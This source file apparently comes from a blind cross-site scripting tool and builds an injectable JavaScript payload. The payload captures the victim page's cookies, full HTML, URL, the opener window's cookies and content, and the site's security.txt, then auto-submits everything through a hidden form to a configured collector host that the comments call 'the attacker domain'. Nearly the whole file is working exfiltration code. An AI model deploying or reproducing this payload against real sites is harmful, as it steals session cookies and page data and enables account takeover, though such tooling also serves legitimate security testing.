import config from '../../config';

const { url, intrusiveLevel, boundary  } = config;

// As some companies might not want all of their innerHTML/Cookies to be leaked to a third-party
// This acts as a barrier, by default config.intrusiveLevel is set to 0, which means
// We will only capture relevant information about the host, and report it
// Sets elements

interface Document { 
      cookie: string;
      documentBody: string;
      url: string;
      location: string;
      openerBody: string;
      openerCookie: string;
}

function determineInstrusive() {
      let capture: Document = {
      cookie: intrusiveLevel === 1 ? 'document.cookie' : 'null',
      documentBody: intrusiveLevel === 1
            ? 'document.body.parentNode.innerHTML'
            : 'identifyTagAndCaptureParentNodes(document.getElementsByTagName("script"))',
      url: intrusiveLevel === 1 ? 'document.URL' : 'document.URL',
      location: intrusiveLevel === 1 ? 'opener.location' : 'opener.location',
      openerBody: intrusiveLevel === 1 ? 'opener.document.body.innerHTML' : 'null',
      openerCookie: intrusiveLevel === 1 ? 'opener.document.cookie' : 'null',
      }
      return capture
}

// Identifying the DOM of the page which was injected at non-intrusive level
// First identify the correct script, where bXSS occured
// Traverse the DOM until we hit the HTML (root element)
function captureParentNodes() {
  return `
      function captureParentNodes(element, _array) {
            if (_array === undefined) {
                  _array = [];
            }
            value = element.nodeName
            if(element.id != '') {
                  value = value + '-' + element.id
            }
            if(element.className != '') {
                  value = value + '-' + element.className
            }
            _array.push(value);
            if(element.nodeName !== 'HTML' ) return captureParentNodes(element.parentNode, _array);
            else return _array;           
      }

      function identifyTagAndCaptureParentNodes(tagName) {
            var scriptLocation = ''
            for(i = 0;i < tagName.length; i++)
            {
            if(tagName[i].src.indexOf('${url}/m')) {
                  scriptLocation = tagName[i]; 
            }
            }
            return captureParentNodes(scriptLocation)
      }
      `;
}

// This function will capture if there as a https://securitytxt.org/
// This information will be used to automatically report security issues
// This will only report security issues automatically if email is configured
// Function sends an XHR to /.well-known/security.txt
// Example would be google.com/.well-known/security.txt (if you found bXSS on google.com)
// Response is captured and fed into generateTemplate function
function checkForSecurityTxt() {
  return `
      function checkForSecurityTxt(url, cb) {
            var checkForSecurityTxt = new XMLHttpRequest();

            checkForSecurityTxt.open("GET", url, true);

            checkForSecurityTxt.onreadystatechange = function() {
                  if(this.readyState === 4 && this.status == 200) {
                        cb(this.responseText);
                  } else if(this.readyState === 4 && this.status != 200) {

                        cb(null);
                  }
            }
            checkForSecurityTxt.send(null);
      }`;
}

// Callback from XHR to get for /.well-known/security.txt on domain
// Creates a new form/input through createElementNS and assigns the document body as a variable
// Appends all the captured data to the input value
// Appends the data to the form, sets the URL as configured and sets the POST method
// The form is then appended the body, window.name is set to __ to prevent loops
// Data is then sent to the attacker domain to be processed
function sendXhr() {
  return `
      var cScript = document.currentScript;   

      function cbSecurityTxt(stxt) {
        
            setTimeout(function(){
         
            if(cScript === undefined || cScript === null) { 
                  var pload = 'null'
            } else {
                  var pload = cScript.outerHTML
            }

            var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'form');
            var __= document.createElementNS('http://www.w3.org/1999/xhtml', 'input');
            var body = document.getElementsByTagName('body')[0];

            __.setAttribute('value',escape(dcoo+'\\r\\n\\r\\n${
              boundary
            }'+inne+'\\r\\n\\r\\n${boundary}'+durl+'\\r\\n\\r\\n${
    boundary
  }'+oloc+'\\r\\n\\r\\n${boundary}'+oloh+'\\r\\n\\r\\n${
    boundary
  }'+odoc+'\\r\\n\\r\\n${boundary}'+stxt+'\\r\\n\\r\\n${boundary}'+pload));
            __.setAttribute('name','_');
            _.appendChild(__);
            _.action='//${url}/m';
            _.method='post';

            body.appendChild(_);
            window.name='__';
            _.submit();
            }, 1000)    
      }
      `;
}

// This does two important things
// Try to capture all the document information depending on pre-defined determineInstrusive function
// Then calls final XHR if it exists from checkForSecurityTxt function success or fail.
function captureInformation(capture) {
  return `
          try {dcoo = ${capture.cookie}} catch(e) {dcoo=null}
          try {inne = ${capture.documentBody}} catch(e) {inne=null}
          try {durl = ${capture.url}} catch(e) {durl=null}
          try {oloc = ${capture.location}} catch(e) {oloc=null}
          try {oloh = ${capture.openerBody}} catch(e) {oloh=null}
          try {odoc = ${capture.openerCookie}} catch(e) {odoc=null}
          try {checkForSecurityTxt("/.well-known/security.txt", cbSecurityTxt)} catch(e) {cbSecurityTxt(null)}`;
}

// This function builds the overall payload
// We check to see if the window.name is __ because by default it will not be
// After a succesfull capture it will set the window.name to be __
// This means it will only fire in that window once, preventing spam
exports.generateTemplate = () => {
  const capture = determineInstrusive();
  const template = `(function(){
        if(window.name!=='__'){

            ${captureParentNodes()}

            ${checkForSecurityTxt()}

            ${captureInformation(capture)}

            ${sendXhr()}

        } else {window.name='__'}
      })();`;

  return template;
};
